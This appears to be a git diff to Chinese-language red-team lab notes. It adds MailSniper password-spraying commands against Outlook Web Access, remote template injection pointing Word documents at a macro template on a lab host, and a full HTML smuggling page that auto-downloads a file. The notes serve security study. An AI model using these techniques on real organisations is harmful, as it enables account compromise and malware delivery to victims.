@@ -26,6 +26,7 @@ Invoke-DomainHarvestOWA -ExchHostname 10.10.15.100
 Invoke-UsernameHarvestOWA -ExchHostname 10.10.15.100 -Domain CYBER -UserList .\possible-usernames.txt -OutFile valid.txt
 ```
 
+MailSniper 可以针对使用 Outlook Web Access (OWA)、Exchange Web Services (EWS) 和 Exchange ActiveSync (EAS) 识别的有效帐户喷洒密码
 对上面的有效用户名进行密码喷洒,密码：```Summer2021```
 ```
 Invoke-PasswordSprayOWA -ExchHostname 10.10.15.100 -UserList .\valid.txt -Password Summer2021
@@ -64,6 +65,14 @@ nglover@cyberbotic.io
 # 内部网络钓鱼
 
 > 访问一个或多个内部邮箱开辟了一些可能性。我们可以搜索可能包含文档、用户名和密码等敏感信息的电子邮件；甚至代表受感染用户向员工发送电子邮件。我们可以发送我们自己制作的文件和/或链接，或者甚至下载已经在收件箱中的文档，将其后门（例如使用宏），然后将其发回给某人
+
+
+# Initial Access Payloads(初始访问负载)
+
+向钓鱼用户发送有效载荷是获得立足点的直接方式，因为它将在他们的系统上执行。提供有效负载的方法大致有两种。
+
+1. 发送一个可以下载有效负载的 URL。
+2. 将有效负载附加到网络钓鱼电子邮件。
 
 
 # HTML Application (HTA)
@@ -157,6 +166,87 @@ Attacks > Web drive-by > Host File
 ## Word Doc 网络钓鱼
 
 把rev shell的vba放进doc文件，发送给用户，诱使用户打开。
+
+
+
+# Remote Template Injection（远程模板注入）
+Microsoft Word 可以选择从模板创建新文档。Office 预装了一些模板，您可以制作自定义模板，甚至可以下载新模板。远程模板注入是一种攻击者向受害者发送良性文档的技术，受害者会下载并加载恶意模板。这个模板可能包含一个宏，导致代码执行
+
+在攻击者桌面上打开 Word，创建一个新的空白文档并插入所需的宏。将此保存```C:\Payloads```为 Word 97-2003 模板 ```(*.dot)``` 文件。这现在是我们的“恶意远程模板”。使用 Cobalt Strike 在```http://nickelviper.com/template.dot```托管此文件
+
+
+接下来，从位于 中的空白模板创建一个新文档```C:\Users\Attacker\Documents\Custom Office Templates```。添加您想要的任何内容，然后将其另存```C:\Payloads```为新的 ```.docx```。浏览到资源管理器中的目录，右键单击并选择```7-Zip > Open archive```。导航到```word > _rels```，右键单击```settings.xml.rels```并选择Edit。
+
+```
+Target="file:///C:\Users\Attacker\Documents\Custom%20Office%20Templates\Blank%20Template.dotx"
+```
+
+替换成
+```
+Target="http://nickelviper.com/template.dot"
+```
+
+
+使用[python tool](https://github.com/JohnWoodman/remoteinjector)可以自动化完成上面的修改
+```
+ubuntu@DESKTOP-3BSK7NO ~> python3 remoteinjector.py -w http://nickelviper.com/template.dot /mnt/c/Payloads/document.docx
+URL Injected and saved to /mnt/c/Payloads/document_new.docx
+```
+
+
+# HTML Smuggling
+
+这个我理解就是通过伪装诱导用户下载一个含有可执行程序的文件
+
+如：
+```
+<a href="http://attacker.com/file.doc">Download Me</a>
+```
+
+可以通过加密伪装文件相关信息绕过AV检测
+```
+<html>
+    <head>
+        <title>HTML Smuggling</title>
+    </head>
+    <body>
+        <p>This is all the user will see...</p>
+
+        <script>
+        function convertFromBase64(base64) {
+            var binary_string = window.atob(base64);
+            var len = binary_string.length;
+            var bytes = new Uint8Array( len );
+            for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
+            return bytes.buffer;
+        }
+
+        var file ='VGhpcyBpcyBhIHNtdWdnbGVkIGZpbGU=';
+        var data = convertFromBase64(file);
+        var blob = new Blob([data], {type: 'octet/stream'});
+        var fileName = 'test.txt';
+
+        if(window.navigator.msSaveOrOpenBlob) window.navigator.msSaveBlob(blob,fileName);
+        else {
+            var a = document.createElement('a');
+            document.body.appendChild(a);
+            a.style = 'display: none';
+            var url = window.URL.createObjectURL(blob);
+            a.href = url;
+            a.download = fileName;
+            a.click();
+            window.URL.revokeObjectURL(url);
+        }
+        </script>
+    </body>
+</html>
+```
+
+
+加密串生成
+```
+ubuntu@DESKTOP-3BSK7NO ~> echo -en "This is a smuggled file" | base64
+```
 
 
 # Parent-Child Relationships
